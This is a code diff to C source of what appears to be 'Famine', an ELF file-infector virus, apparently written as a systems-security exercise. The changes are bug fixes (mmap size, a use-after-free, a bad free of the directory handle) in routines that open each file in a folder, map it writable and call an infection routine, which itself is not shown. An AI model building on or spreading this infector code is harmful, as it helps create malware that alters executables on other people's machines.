@@ -98,7 +98,7 @@ int get_binary_data(char *file_name, t_famine *famine)
             return (close(famine->input_file_fd) == -1 ? error(ERROR_CLOSE, famine) : error(ERROR_LSEEK, famine));
         }
         // Copy binary address map
-        if (!(famine->mmap_ptr = mmap(0, famine->binary_data_size + PAGE_SIZE + 1000, PROT_READ | PROT_WRITE, MAP_SHARED, famine->input_file_fd, 0)))
+        if (!(famine->mmap_ptr = mmap(0, famine->binary_data_size + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, famine->input_file_fd, 0)))
         {
             return (close(famine->input_file_fd) == -1 ? error(ERROR_CLOSE, famine) : error(ERROR_MMAP, famine));
         }
@@ -113,11 +113,11 @@ int get_binary_data(char *file_name, t_famine *famine)
 int infect_file_in_folder(const char *path)
 {
     struct dirent *dp;
-    DIR *dir = opendir(path);
+    DIR *dir;
     t_famine *famine;
     char *input_file_name;
 
-    if (!dir)
+    if (!(dir = opendir(path)))
     {
         // Unable to open directory stream
         if (DEBUG == true)
@@ -156,19 +156,17 @@ int infect_file_in_folder(const char *path)
         famine->shdr = (t_elf_shdr *)((famine->mmap_ptr + famine->ehdr->e_shoff));
         apply_infection(famine);
 
-        free_famine(famine);
         if (close(famine->input_file_fd) == -1)
         {
+            free_famine(famine);
             return ERROR_CLOSE;
         }
+        free_famine(famine);
     }
 
-    printf("free the dir here\n");
     if (closedir(dir) == -1)
     {
-        free(dir);
         return ERROR_CLOSEDIR;
     }
-    printf("free the dir here\n");
     return 0;
 }
